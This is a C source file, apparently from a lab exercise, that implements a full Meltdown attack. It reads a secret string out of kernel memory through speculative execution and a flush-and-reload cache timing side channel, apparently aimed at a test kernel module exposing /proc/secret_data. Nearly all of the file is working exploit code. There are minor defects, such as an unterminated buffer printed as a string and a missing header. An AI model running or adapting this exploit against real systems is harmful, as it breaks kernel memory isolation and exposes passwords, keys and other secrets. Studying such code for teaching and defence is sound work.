/*
 * full.c 
 * Complete meltdown attack on entire secret string in kernel memory. 
 *
 * NOTE:
 * Extremely likely that attack is successful now. 
 *
 * Kyle Dotterrer
 * December, 2018 
 */

#include <stdio.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

/* ----------------------------------------------------------------------------
	Constants
*/

// address of the start of secret data in kernel memory 
// NOTE: this address will change each time kernal module is reinstalled 
#define BASE_KERNEL_ADDR (0xf8d73000)

// number of bytes of secret to read 
// in this case, we know length of secret string is 6 chars 
#define SECRET_LEN  (6)

// array access below cycles assumed to be cache hit  
#define CACHE_HIT_THRESHOLD (80)  

#define N_ATTACK_ITERS (1000)

#define ARRSIZE (256)
#define DELTA   (1024)  // offset on each array access 

/* ----------------------------------------------------------------------------
	Local Prototypes 
*/

int attack_one(int bytenum, int vfd); 

void flush_side_channel  (void);
void reload_side_channel (void); 

void meltdown_asm(unsigned long base_kernel_data_addr, unsigned long offset);

static void catch_segv(); 

/* ----------------------------------------------------------------------------
	Global Variables 
*/

static sigjmp_buf jbuf;

// probe array 
uint8_t array[ARRSIZE*4096];

// scores array 
static int scores[ARRSIZE];

/* ----------------------------------------------------------------------------
	Main
*/

int main(void) {
	// setup signal handler for memory violation 
	signal(SIGSEGV, catch_segv);

	// open the /proc/secret_data virtual file 
	// in our kernel module implementation, we allow a user-level process to invoke a function inside of the module
	// in this case, the function reads the secret data WITHOUT actually leaking it to the user process
	int vfd = open("/proc/secret_data", O_RDONLY);
	if (vfd < 0) {
		perror("open");
		exit(1); 
	}

	// buffer for our guess for secret 
	char guess[SECRET_LEN]; 

	// flush the probe array
	flush_side_channel();

	for (int i = 0; i < SECRET_LEN; i++) {
		// attack a single char of secret data 
		guess[i] = (char) attack_one(i, vfd); 
	}

	printf("secret values are: \n"); 
	for (int i = 0; i < SECRET_LEN; i++) {
		printf("%d ", (int) guess[i]);
	}
	printf("\n");

	printf("secret string is: %s\n", guess);

	exit(0); 
}

/* ----------------------------------------------------------------------------
	Local Functions 
*/

int attack_one(int bytenum, int vfd) {
	int ret; 

	// reset the scores array 
	memset(scores, 0, sizeof(scores));

	// compute address offset based on byte number 
	unsigned long offset = (unsigned long) bytenum; 

	for (int i = 0; i < N_ATTACK_ITERS; i++) {
		// make sure the secret data is cached 
		if ((ret = pread(vfd, NULL, 0, 0)) < 0) {
			perror("pread");
			break; 
		}

		// flush the probe array 
		for (int j = 0; j < ARRSIZE; j++) {
			_mm_clflush(&array[j*4096 + DELTA]);
		}

		// and do the thing 
		if (sigsetjmp(jbuf, 1) == 0) {
			meltdown_asm(BASE_KERNEL_ADDR, offset);
		} 

		// reload the probe array 
		reload_side_channel();
	}

	// compute the maximum score for attack on this char 
	// skip 0 because of its natual tendency to be the winner 
	int max_idx = 1;
	for (int i = 1; i < ARRSIZE; i++) {
		if (scores[i] > scores[max_idx])
			max_idx = i;
	}

	return max_idx; 
}

void flush_side_channel(void) {
	// write to array to bring it to RAM
	// prevents copy on write 
	for (int i = 0; i < ARRSIZE; i++) 
		array[i*4096 + DELTA] = 1;

	// flush the entire array from cache 
	for (int i = 0; i < ARRSIZE; i++) 
		_mm_clflush(&array[i*4096 + DELTA]);
}

void reload_side_channel(void) {
	// where we store register contents
	// dont care about this 
	unsigned int junk = 0;

	register uint64_t time1, time2;
	volatile uint8_t *addr;

	for (int i = 0; i < ARRSIZE; i++) {
		addr = &array[i*4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr; 
		time2 = __rdtscp(&junk) - time1;

		// large variable latency of access time due to caching 
		// allows us to determine (with high degree of certainty)
		// what the secret value used to access the array was 
		if (time2 <= CACHE_HIT_THRESHOLD) {
			// cache hit, increment score for this value 
			scores[i]++;
		}
	}
}

void meltdown_asm(unsigned long base_kernel_data_addr, unsigned long offset) {
	char kernel_data = 0;

	// give eax something to do while memory access is speculated 
	// another mechanism to improve probability data race is won 
	asm volatile (
		".rept 400;"
		"add $0x141, %%eax;"
		".endr;"

		:
		:
		: "eax"
	); 

	// operation will cause memory violation
	kernel_data = *(char *) (base_kernel_data_addr + offset);

	// now we use the kernel data to access the probe array 
	array[kernel_data*4096 + DELTA] += 1;
}

static void catch_segv() {
	siglongjmp(jbuf, 1); 
}
